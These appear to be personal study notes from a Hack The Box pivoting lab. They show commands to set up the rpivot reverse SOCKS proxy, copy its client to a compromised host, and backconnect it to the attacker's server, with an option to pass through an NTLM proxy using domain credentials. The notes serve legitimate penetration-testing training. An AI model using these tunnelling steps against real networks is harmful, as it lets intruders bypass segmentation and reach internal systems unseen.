- Rpivot is a reverse SOCKS proxy tool written in Python for SOCKS tunneling. Rpivot binds a machine inside a corporate network to an external server and expopses the client's local port on the server-side. 

![[Pasted image 20251104212232.png]]

**Cloning rpivot**
```shell-session
realCustampin@htb[/htb]$ git clone https://github.com/klsecservices/rpivot.git
```

**Installing Python 2.7**
```shell-session
realCustampin@htb[/htb]$ sudo apt-get install python2.7
```

**Running server.py from the Attack Host**
```shell-session
realCustampin@htb[/htb]$ python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0
```

Before running client.py, we need to transfer that file over to the target. 

```shell-session
realCustampin@htb[/htb]$ scp -r rpivot ubuntu@<IpaddressOfTarget>:/home/ubuntu/
```

**Running client.py from Pivot Target:**
```shell-session
ubuntu@WEB01:~/rpivot$ python2.7 client.py --server-ip 10.10.14.18 --server-port 9999

Backconnecting to server 10.10.14.18 port 9999
```

**Connecting to a Web Server using HTTP-Proxy & NTLM Auth**
```shell-session
python client.py --server-ip <IPaddressofTargetWebServer> --server-port 8080 --ntlm-proxy-ip <IPaddressofProxy> --ntlm-proxy-port 8081 --domain <nameofWindowsDomain> --username <username> --password <password>
```

10.129.138.136